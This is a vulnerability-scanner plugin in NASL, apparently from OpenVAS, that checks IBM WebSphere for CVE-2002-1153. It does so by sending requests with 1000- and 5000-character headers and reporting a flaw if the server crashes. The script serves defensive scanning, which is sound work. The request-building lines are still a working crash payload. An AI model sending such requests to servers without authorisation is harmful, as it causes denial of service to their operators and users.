if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11181" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 5749 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2002-1153" );
	script_name( "WebSphere Host header overflow" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_ibm_http_server_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "ibm/http_server/detected" );
	script_tag( name: "solution", value: "Install PQ62144 or later." );
	script_tag( name: "summary", value: "It was possible to kill the WebSphere server by
  sending an invalid request for a .jsp with a too long Host: header." );
	script_tag( name: "impact", value: "An attacker may exploit this vulnerability to make the web server
  crash continually." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
r1 = NASLString( "GET /foo.jsp HTTP/1.1\\r\\n Host: ", crap( 1000 ), "\\r\\n\\r\\n" );
send( socket: soc, data: r1 );
r = http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
r2 = http_get( item: "/bar.jsp", port: port );
r2 = r2 - NASLString( "\\r\\n\\r\\n" );
r2 = NASLString( r2, "\\r\\n", "VT-Header: ", crap( 5000 ), "\\r\\n\\r\\n" );
send( socket: soc, data: r2 );
http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

